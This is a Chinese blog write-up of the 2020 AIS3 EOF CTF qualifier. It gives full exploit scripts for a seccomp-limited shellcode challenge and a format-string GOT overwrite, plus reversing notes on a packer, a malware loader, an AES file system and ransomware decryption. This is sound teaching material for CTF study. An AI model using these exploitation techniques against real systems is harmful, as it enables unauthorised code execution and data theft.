---
layout: post
title: 2020 AIS3 EOF 初賽 Write-up
date: 2021-01-11
Author: LJP-TW
tags: [CTF]
comments: true
toc: true
excerpt_separator: <!--more-->
---

# 導覽

* Pwn:
  * EDUshell
    * Linux ELF, 執行你送的 shellcode, 題目主要限制使用 read syscall
  * Illusion
    * Linux ELF, 在執行 `main` 之前還有其他 constructor function, 改掉了與 dynamic linking 有關的部分, 使得 `puts` 和 `printf` 互換
* Reversing
  * abexcm100
    * Windows exe, 看來有被 PESpin pack 過
  * DuRaRaRa
    * Windows exe, 本身只是 malware loader, 真正的 malware 躺在記憶體中
  * Jwang's Terminal
    * Windows exe, C++, 自己實作了 file system, 檔案以 AES 加密
  * ransomware
    * Windows exe, 把檔案用特定方式加密

<!--more-->

# Pwn

## EDUshell

* 題目以一個 shell 呈現, 提供了 `loadflag` `exec` `help` `whoami` `ls` `cat` `exit` 這幾個功能

* 執行 `loadflag` 後會將 flag 讀取到全域變數上, 並且開啟 seccomp, 能供利用的 syscall 只有 read

  ![image-20210111114518690](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111114518690.png)

* `exec` 可以執行 shellcode

  ![image-20210111114619737](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111114619737.png)

* `cmd` 是以 `scanf` 讀取, 會被 NULL Byte 截斷

* shellcode 可以設計成兩部分

  * 第一部分
    * 呼叫 `read` 讀取第二部分 shellcode, 如此一來第二部分的 shellcode 就不會被 NULL Byte 截斷
  * 第二部分
    * 將 flag 第一個字讀取出來
    * 看是否小於 0x80
      * 小於則進入無限迴圈, 如此連線就不會斷掉
      * 大於等於則執行 seccomp 不允許的 syscall, 如此連線就會斷掉
    * 以連線是否還在來判斷是否小於 0x80
    * 二分搜尋
    * 將 flag 內容逐一爆破

* exploit:

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

timeout = 0.3
def check(offset, target):
    def loadflag():
        p.sendlineafter(b'SHELL $ ', b'loadflag')
    
    def _exec(payload):
        p.sendline(b'exec ' + payload)
    
    # p = process('./EDUshell')
    p = remote('eofqual.zoolab.org', 10101)
    # p = remote('172.20.0.1', 10101)
    
    loadflag()
    
    sleep(timeout)
    sc = asm('''
        mov rsi, rdx
        xor rdx, rdx
        xor rdi, rdi
        xor rax, rax
        mov dx, 0x1234
        syscall
    ''')
    
    _exec(sc)
    
    sleep(timeout)
    sc2 = asm('''
        mov rcx, rbx
        add rcx, ''' + str(offset) + '''
        mov al, BYTE PTR [rcx]
        cmp ax, ''' + str(target) + '''
        jb SAFE
        xor rax, rax
        inc rax
        syscall
    SAFE:
        mov rsi, rdx
        xor rdx, rdx
        xor rdi, rdi
        xor rax, rax
        mov dx, 0x1234
        syscall
    LOOP:
        nop
        nop
        nop
        jmp LOOP
    ''')

    try:
        # raw_input('>')
        p.sendline(sc + sc2)
        # raw_input('>')
        sleep(timeout)
        p.sendline(b'GG')
        p.recv(5, timeout=timeout)
    except EOFError:
        print('EOFerror except')
        return 0
    except:
        print('other except')
        return 0

    return 1

offset = 0x27c0
flag = b''

for i in range(80):
    r = 0x80
    l = 0x00
    t = r
    while l + 1 != r:
        if check(offset + i, t):
            r = t
        else:
            l = t
        t = (r + l) // 2
    flag += bytes([l])
    print(flag)
    if l == ord('}'):
        break

print(flag)

```

## Illusion

* `main` 非常簡單, 看起來沒有可用的漏洞

  ![image-20210111115515056](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111115515056.png)

* 不知道從何下手, 於是乎就 `readelf -a illusion` 了一下, 發現異常多的 section header

  ![image-20210111115757828](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111115757828.png)

  ![image-20210111120233254](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111120233254.png)

* 位置是 0x12d9, 動態追蹤, 斷點斷在 0x12d9 和 `main`, 結果你猜怎麼了, 斷點先到 0x12d9 了

  ![image-20210111120501343](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111120501343.png)

* 而且看起來還是個正常的 function

![image-20210111120748219](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111120748219.png)

* 但 IDA 裡面 0x12d9 是一片空白

  ![image-20210111120619653](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111120619653.png)

* 沒有關係, 那我用 gdb 把在 0x12d9 的 function dump 下來分析

  * `dump memory dump.dmp 0x0000555555555000 0x0000555555557000` 
  * dump 整個 segment
  * IDA 打開 `dump.dmp`, Edit > Segments > Rebase program, 將 Segment 開頭設為 0x0000555555555000

* 這樣分析起來就舒服多了, 但其實還是要配動態分析才能更快

  ![image-20210111121221757](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111121221757.png)

* 分析這個 function

* 一開始會讀出 flag, 計算其 md5, 符合特定值才做事

* 做的事情就是改 `printf` 和 `puts` Relocation entry, 讓 `printf` 最終會 link 到 `puts`, `puts` 最終會 link 到 `printf`

  * 原本的 ELF

    ![image-20210111122205427](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111122205427.png)

  * 改過的 ELF

    ![image-20210111122228121](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111122228121.png)

  * 最終在 IDA 上的樣子

    ![image-20210111122349637](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111122349637.png)

  * 多了 FSB 啦!!

  * 追蹤這部分的 code 可以學到怎麼解析 relocation table, 至於詳細的過程另外發一篇筆記好了 (篇數小偷

* exploit 就是打 FSB

```python
#!/usr/bin/env python3
from pwn import *

# p = process('./illusion', env={"LD_PRELOAD" : "./libc.so.6"})
p = remote('eofqual.zoolab.org', 10104)

raw_input('>')
payload = b'|%p|%13$p|%15$p|'
p.sendline(payload)

p.recvuntil(b'|')
libc = int(p.recvuntil(b'|', drop=True), 16) - 0x1ec723
log.info('libc: ' + hex(libc))

stack = int(p.recvuntil(b'|', drop=True), 16)
log.info('stack: ' + hex(stack))

text = int(p.recvuntil(b'|', drop=True), 16) - 0x1211
log.info('text: ' + hex(text))

exit_got = text + 0x5018
one_gadget = libc + 0xe6e76
r10 = stack - 0x32f8

one_gadgets = []
idx = [0, 1, 2]
for i in range(3):
    one_gadgets.append((one_gadget >> (i * 16)) & 0xffff)

for i in range(3):
    for j in range(i + 1, 3):
        if one_gadgets[i] > one_gadgets[j]:
            tmp = one_gadgets[i]
            one_gadgets[i] = one_gadgets[j]
            one_gadgets[j] = tmp
            tmp = idx[i]
            idx[i] = idx[j]
            idx[j] = tmp

for i in range(2, 0, -1):
    one_gadgets[i] = one_gadgets[i] - one_gadgets[i - 1]

print(one_gadgets)
print(idx)

raw_input('>')
payload  = b'%17$n%18$n'

for i in range(3):
    payload += '%{}c%{}$hn'.format(one_gadgets[i], 14 + idx[i]).encode()
payload += b'a' * (8 * 8 - len(payload))
payload += p64(exit_got)
payload += p64(exit_got + 2)
payload += p64(exit_got + 4)
payload += p64(r10)
payload += p64(r10 + 4)
p.sendline(payload)

log.info(hex(exit_got))
log.info(hex(exit_got + 2))
log.info(hex(exit_got + 4))
log.info(hex(r10))

p.interactive()
```

# Reversing

## abexcm100

* 直接執行的話

  ![image-20210111141706776](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111141706776.png)

  ![image-20210111141735221](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111141735221.png)

* 開 IDA 發現是亂的, 查殼一下發現是用 PESpin pack 過

  ![image-20210111142104619](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111142104619.png)

* 直接動態跑跑看, 用 x32dbg F9 F9 F9 ...

  ![image-20210111142326263](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111142326263.png)

  ![image-20210111144235915](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111144235915.png)

* 看到這怪怪的位址後, 再一次 F9, 第一個 message box 就跳出來了, 這時候暫停 debugger 再回來看這個位址

  ![image-20210111143232619](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111143232619.png)

  * 看來是跑一段脫殼一段的噁爛殼
  * 那個 `YEAH!` 看來就是正解區, 跳到 0x401044

  ![image-20210111143444774](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111143444774.png)

  * xor flag

* 把 0x402064 的密文 xor 0x77 就能得到 flag

  ![image-20210111143559982](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111143559982.png)

## DuRaRaRa

* 用 IDA 開起來後, 看他 Imports 有哪些 function, 裡面最有嫌疑的就是 `VirtualAlloc`, 看他在哪被呼叫, 就追到了一個神祕 function

  ![image-20210111144655752](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111144655752.png)

  * 開一個新 Thread 執行 0x403020 的內容, 看一下 0x403020 裡面是啥

    ![image-20210111144722952](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111144722952.png)

  * 開頭是 MZ, 有 Dos Header 常有的字串, 後面有 PE, 看起來一整個就是另一個 exe 的 PE Header

* 此程式只負責把 0x403020 裡頭的 PE 跑起來, 自己只是個 loader

* 把真正要跑的程式 dump 出來

* IDA 中 File > Script Command

```
auto fname      = "D:\\dump_mem.bin";
auto address    = 0x0403020;
auto size       = 0x5a492;
auto file= fopen(fname, "wb");

savefile(file, 0, address, size);
fclose(file);
```

* 繼續分析 `dump_mem.bin`

  ![image-20210111145705343](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111145705343.png)

  * 開 flag 檔案, flag 在 `C:\Users\terrynini38514\Desktop\flag.txt`

  ![image-20210111145748522](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111145748522.png)

  * 開暫存檔
  * 讀 flag

  ![image-20210111150200768](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111150200768.png)

  * 將 flag 每 5 個字 MD5 一次後 xor 對應 key 存到暫存檔案

* 反解 flag, secret.txt 每 32 個字就表示一個 hash, 將其 xor key 後得到以下清單

```
6bde0a2e4131eede7f7aef53687bc56d
ca2555b00b694a2494b84b8ee911bc29
50b92ea83fef034ce2a7f3fdb82aea73
8cb08bb0651be649a777d6578672c881
9c26df9ed253653eb1de64552bdd5a77
bbc23f75304b877490b8b81cd10e64ff
a2879a3a26467c43f039b0d224ec5c9e
d850f04cdb48312a9be171e214c0b4ee
cd22643b1c1627a0419a8a3ab0c9fb80
f801f18ef1a5f4847863ed9e30544ef5
e47390fe89658d45f3532d95dcc0c51e
a90e199623c1c7b73301dd4b46346a02
0e38ee4c606cf8aa5294f70e525a67b5
38896c05de797867402b5a6bc816cd21
f34e7e8b47404664968dd01536be8148
5623a9bfaa9fdd31dc845be686f4f200
ebdc04cdf7446ccb3b74ab493e8462f6
94306df994fbde6bfe01920e4f269330
```

* `hashcat64 -a 3 -m 0 hashes.txt ?a?a?a?a?a` 

```
6bde0a2e4131eede7f7aef53687bc56d FLAG{
ca2555b00b694a2494b84b8ee911bc29 wait_
50b92ea83fef034ce2a7f3fdb82aea73 what_
8cb08bb0651be649a777d6578672c881 are_y
9c26df9ed253653eb1de64552bdd5a77 ou_lo
bbc23f75304b877490b8b81cd10e64ff oking
a2879a3a26467c43f039b0d224ec5c9e _for_
d850f04cdb48312a9be171e214c0b4ee there
cd22643b1c1627a0419a8a3ab0c9fb80 _is_n
f801f18ef1a5f4847863ed9e30544ef5 othin
e47390fe89658d45f3532d95dcc0c51e g_ins
a90e199623c1c7b73301dd4b46346a02 ide_t
0e38ee4c606cf8aa5294f70e525a67b5 his_v
38896c05de797867402b5a6bc816cd21 m_hac
f34e7e8b47404664968dd01536be8148 ker_h
5623a9bfaa9fdd31dc845be686f4f200 acker
ebdc04cdf7446ccb3b74ab493e8462f6 _go_a
94306df994fbde6bfe01920e4f269330 way!}
```

## Jwang's Terminal

![image-20210111151724474](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111151724474.png)

* 題目實作了自定義的 file system, 檔案除了 `README.txt` 以外都有加密過

* 反正就是逆向這支程式  ʅ(´◔౪◔)ʃ

* `main` 

  ![image-20210111152808742](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111152808742.png)

  * 執行 `cls` 清空畫面
  * 解開 file system
  * 後面就是 shell 的部分

* 怎麼解 file system 的

  ![image-20210111153205635](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111153205635.png)

  * `FS_raw` 是 file system 起頭位址

  * 前八個字為 `hackerFS`

  * 接著的 8 Bytes 為版本號

  * 看一下 `FS_raw` 長相

    ![image-20210111153239040](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111153239040.png)

    ![image-20210111153348746](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111153348746.png)

  * 初始化一個 stack

  * `file::file` 解析一個 `file_item` 

  * 解完後接著的 4 Bytes 為 `item_num`, 若此 `file_item` 是一個目錄, 則 `item_num` 表示底下有幾個東西

  *  `file::file` 解析格式為

    * Type (4 Bytes)  : 0 為目錄, 1 為檔案
    * Filename Length (2 Bytes) : File name 長度
    * Filename (\<Filename Length\> Bytes) : File name
    * Content Length (4 Bytes) : Content 長度
    * Content (\<Content Length\> Bytes) : Content
    
    ![image-20210111153915136](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111153915136.png)

  * DFS 沿著目錄一直解析下去

* `type` 指令是怎麼解密檔案的

  ![image-20210111154216586](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111154216586.png)

  * 看來寫在 `file_decrypt[abi:cxx11]` 中

  ![image-20210111154259794](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111154259794.png)

  * 原來是固定 key 和 iv 的 AES 阿

* 從 README.txt 內容來看, 看來 flag 就在其中一個檔案中

* 把 `hackerFS` 整個 dump 下來, 自己寫腳本解, 把所有檔案解密輸出到同一個檔案中

* 腳本如下

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES  
import struct

def decrypt(content):
    iv  = b'\xA1\xA4\xC4\x1C\x1C\x5B\xC5\x2E\x90\xDA\xB8\xFE\x46\x23\xBF\xBB'
    key = b'\xE9\x31\xDF\xC0\xC3\x7A\xEE\xAC\x6E\xC9\x87\x1C\x8A\x7A\xF6\xEC'

    cipher = AES.new(key, AES.MODE_CBC, iv)

    return cipher.encrypt(content).decode(errors='ignore')

def u32(bs):
    return struct.unpack('<I', bs)[0]

def u16(bs):
    return struct.unpack('<H', bs)[0]

def parseFS(fs):
    idx = 0x10
    allplaintext = ''

    def parseItem(fs, idx):
        i_type = u32(fs[idx:idx+4])
        idx += 4
        i_namelen = u16(fs[idx:idx+2])
        idx += 2
        i_name = fs[idx:idx+i_namelen]
        idx += i_namelen
        i_contentlen = u32(fs[idx:idx+4])
        idx += 4
        i_content = fs[idx:idx+i_contentlen]
        idx += i_contentlen
        idx += 4
        return (i_type, i_name, i_content, idx)

    while True:
        item_type, item_name, item_content, idx_next = parseItem(fs, idx)
        idx = idx_next

        if item_name == b'README.txt':
            break

        if item_type == 1:
            print(item_type)
            print(item_name)
            print(item_content)
            plain_content = decrypt(item_content)
            allplaintext += plain_content
    
    return allplaintext

with open('hackerFS', 'rb') as f:
    fs = f.read()

allplaintext = parseFS(fs)

with open('output.txt', 'wb') as f:
    f.write(allplaintext.encode())

```

* Get flag!


## ransomware

* 這題我沒逆, 主要是隊友 [jesse](https://github.com/jaidTw) 在看, 提到了關鍵程式碼可以爆破, 然後我就接力爆出來了

  ![image-20210111155031860](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111155031860.png)

  * MODULO 為 0x4000, 中間 xor 的部分, j 的可能性就只有 0x4000 種

* 於是乎開始爆破解所有 jpg, 以下是 script

```python
#!/usr/bin/env python3

with open('./secret.bin', 'rb') as f:
    secret = list(f.read())

def animate(now, total):
    print('[', end='')
    percent = now * 100 // total
    star = percent * 30 // 100
    empty = 30 - star
    print('*' * star, end='')
    print('_' * empty, end='')
    print('] ', end='')
    print('%.4f' % (now * 100 / total), end='')
    print('%', end='\r')

for i in range(1, 144):
    output_f = './out_' + str(i) + '.jpg'
    filename = './' + str(i) + '.jpg'

    with open(filename, 'rb') as f:
        f_content = list(f.read())

    possible_j = []
    now = 0
    total = 0x4000
    for j in range(0, 0x4000):
        now += 1
        animate(now, total)

        tmp_f_content = f_content.copy()
        size = len(tmp_f_content)

        # 0xFF
        result = tmp_f_content[0] ^ secret[(j + 0) % 0x4000]
        if result != 0xFF:
            continue

        # 0xD8
        result = tmp_f_content[1] ^ secret[(j + 1) % 0x4000]
        if result != 0xD8:
            continue

        # 0xFF
        result = tmp_f_content[2] ^ secret[(j + 2) % 0x4000]
        if result != 0xFF:
            continue

        possible_j.append(j)

    print()
    print('possible j :')
    for j in possible_j:
        print(j)

    j = possible_j[0]

    for idx in range(len(f_content)):
        f_content[idx] ^= secret[(j + idx) % 0x4000]
    
    with open(output_f, 'wb') as f:
        f.write(bytes(f_content))

print('ok')
```

* 每張 jpg 看起來是一張大圖的分割

  ![image-20210111155349749](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111155349749.png)

* 從最後一張開始拚回來, 就拚回 flag 了

  ![image-20210111155446980](https://raw.githubusercontent.com/LJP-TW/blog/master/images/post/2021-01-11-AIS3-EOF-Qual/image-20210111155446980.png)

* 字跡非常工整(x



